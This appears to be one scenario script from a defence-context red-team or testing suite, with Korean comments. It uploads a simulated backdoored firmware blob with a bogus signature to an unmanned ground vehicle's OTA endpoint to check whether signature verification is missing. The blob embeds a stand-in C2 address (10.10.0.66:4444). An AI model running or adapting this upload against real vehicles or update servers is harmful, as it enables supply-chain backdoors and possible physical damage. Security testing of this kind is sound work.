"""
S4 - 펌웨어 OTA 변조 : UGV 지속성/공급망 공격
=============================================
목표(방산 맥락): 서명 검증이 없는 무선 펌웨어 업데이트(OTA) 엔드포인트에
악성 펌웨어를 업로드하여 UGV(무인지상차량)에 백도어를 심는다.
장기 지속성(persistence) 및 물리 파괴로 이어질 수 있는 고위험 단계.

기법:
  - 위조 펌웨어 바이너리 + 아무 서명 문자열로 업로드
  - 서버가 서명을 검증하지 않으면 그대로 수락됨
"""
import sys
import json
import requests

def run(target="http://victim:8080"):
    result = {"scenario": "S4_firmware_ota", "target": target, "steps": []}

    # 악성 펌웨어(모사) — 실제로는 부트로더 백도어 등이 포함될 수 있음
    malicious_fw = b"\x7fELF" + b"BACKDOOR_PAYLOAD_C2=10.10.0.66:4444" + b"\x00" * 64
    files = {"firmware": ("ugv_update_v9.bin", malicious_fw,
                          "application/octet-stream")}
    data = {"asset": "MULE-07", "signature": "INVALID-SIG-ATTACKER"}

    try:
        r = requests.post(f"{target}/api/firmware/upload",
                          files=files, data=data, timeout=8)
        body = r.json()
        result["steps"].append(
            {"action": "upload_malicious_firmware", "status": r.status_code,
             "body": body})
        result["success"] = bool(body.get("accepted"))
        result["impact"] = ("악성 펌웨어 수락됨 → UGV 백도어/지속성 확보"
                            if result["success"]
                            else "서명 검증에 의해 거부됨")
    except Exception as e:
        result["steps"].append({"action": "upload", "error": str(e)})
        result["success"] = False
        result["impact"] = "업로드 실패(연결/차단)"
    return result


if __name__ == "__main__":
    t = sys.argv[1] if len(sys.argv) > 1 else "http://victim:8080"
    print(json.dumps(run(t), ensure_ascii=False, indent=2))
